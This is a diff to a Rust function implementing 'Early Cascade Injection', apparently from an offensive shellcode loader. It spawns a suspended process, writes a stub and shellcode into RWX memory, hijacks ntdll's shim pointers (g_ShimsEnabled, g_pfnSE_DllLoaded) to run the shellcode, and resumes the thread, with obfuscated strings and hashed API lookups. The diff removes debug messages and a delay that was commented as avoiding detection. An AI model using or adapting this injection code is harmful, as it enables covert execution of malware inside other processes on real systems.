@@ -8,14 +8,8 @@ mod stub;
 pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &str) -> Result<(), String> {
     use obfstr::obfstr;
 
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("Starting Early Cascade Injection...");
-
     // 1. Create Process in Suspended State
     let process_info = crate::utils::remote::create_process(target_program, CREATE_SUSPENDED)?;
-
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("Process created. PID: {}", process_info.dwProcessId));
 
     // 2. Prepare Cascade Stub
     let cascade_stub = stub::get_stub();
@@ -31,9 +25,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     // 3. Allocate Memory in Target Process
     let total_len = cascade_stub.len() + shellcode_len;
     let remote_mem = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, total_len, PAGE_EXECUTE_READWRITE)?;
-    
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("Allocated memory at: {:#x}", remote_mem));
 
     // 4. Resolve ntdll sections
     let ntdll_hash = crate::dbj2_hash!(b"ntdll.dll");
@@ -48,9 +39,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     
     let g_shims_enabled = data_base + 0x6cf0;
     let g_pfn_se_dll_loaded = mrdata_base + 0x270;
-
-    #[cfg(feature = "debug")]
-    crate::utils::print_message(&format!("g_ShimsEnabled: {:#x}, g_pfnSE_DllLoaded: {:#x}", g_shims_enabled, g_pfn_se_dll_loaded));
 
     // 5. Patch Cascade Stub
     // Stub Layout:
@@ -91,10 +79,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     
     crate::api::write_virtual_memory(process_info.hProcess, g_shims_enabled, &[shim_enabled_val])?;
 
-    // Add random delay to avoid detection patterns
-    use crate::api::delay_execution_seconds;
-    delay_execution_seconds(1)?;
-
     // 8. Overwrite g_pfnSE_DllLoaded
     // First change protection to RW
     let _old_prot = crate::api::protect_virtual_memory(process_info.hProcess, g_pfn_se_dll_loaded, std::mem::size_of::<usize>(), PAGE_READWRITE)?;
@@ -106,9 +90,6 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize, target_program: &
     
     // 9. Resume Thread
     crate::api::resume_thread(process_info.hThread)?;
-
-    #[cfg(feature = "debug")]
-    crate::utils::print_message("Injection completed successfully.");
 
     Ok(())
 }
